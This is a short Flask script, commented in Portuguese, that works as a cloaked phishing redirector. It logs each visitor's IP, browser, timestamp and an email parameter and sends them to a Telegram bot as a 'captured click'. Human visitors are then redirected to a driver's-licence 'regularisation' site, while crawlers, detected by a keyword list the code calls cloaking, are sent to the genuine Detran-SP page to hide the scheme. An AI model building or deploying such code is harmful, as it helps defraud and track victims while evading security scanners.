import os
from flask import Flask, request, redirect
import requests
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def index():
    # Configurações do Telegram
    TOKEN = ""
    CHAT_ID = ""

    # Captura de dados
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    email = request.args.get('email', 'Não fornecido')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # Identificação de Bot/Cloaking
    bot_keywords = [
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
        'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 
        'amazonbot', 'applebot', 'headless', 'lighthouse', 'bot', 'spider', 'crawl'
    ]
    is_bot = any(bot in user_agent.lower() for bot in bot_keywords)

    # Log para o Telegram (Apenas se for humano para evitar spam de bots)
    if not is_bot:
        msg = (f"🚀 **Novo Clique Capturado!**\n\n"
               f"📅 Data: {timestamp}\n"
               f"🌐 IP: {ip}\n"
               f"📧 Email: {email}\n"
               f"💻 OS/Browser: {user_agent}")
        
        try:
            url_tg = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            requests.post(url_tg, data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=5)
        except Exception as e:
            print(f"Erro ao enviar log: {e}")

    if is_bot:
        return redirect("https://www.detran.sp.gov.br/", code=302)
    
    return redirect("https://regularizecnh.com", code=302)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
